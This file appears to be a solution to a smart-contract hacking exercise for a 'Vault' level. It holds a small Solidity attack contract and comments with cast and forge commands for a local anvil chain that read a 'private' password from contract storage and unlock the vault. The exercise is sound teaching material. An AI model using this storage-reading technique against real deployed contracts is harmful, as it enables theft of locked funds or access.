// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/levels/Vault/Vault.sol";

contract VaultTest {
    function attack(address vaultAddress, bytes32 password) public {
        Vault vault = Vault(vaultAddress);

        vault.unlock(password);

        assert(!vault.locked());
    }
}

// Steps to hacking the vault contract using cast and anvil:
// 1. Export your env variables
// 2. Spin up anvil by running the following command in the CLI:
//    $ anvil
// 3. Deploy the vault contract by running the following command:
//    $ forge create --private-key $<PRIVATE_KEY> src/<PATH_TO_THE_FILE>:<CONTRACT_NAME> --constrctor-args <PASSWORD_OF_YOUR_CHOICE>
// 4. Read the private variable from the Vault contract:
//    $ cast storage <CONTRACT_ADDRESS> <STORAGE_SLOT>
// 5. Deploy the hack contract by running the following command:
//    $ forge create --private-key $<PRIVATE_KEY> test/<PATH_TO_THE_FILE>:<CONTRACT_NAME>
// 6. Execute the attack function in the HackVault contract:
//    $ cast send --private-key <YOUR_PRIVATE_KEY> <TARGET_CONTRACT> <FUNC_SELECTOR> <ARGS_PASSED_TO_THE_CONSTRUCTOR>
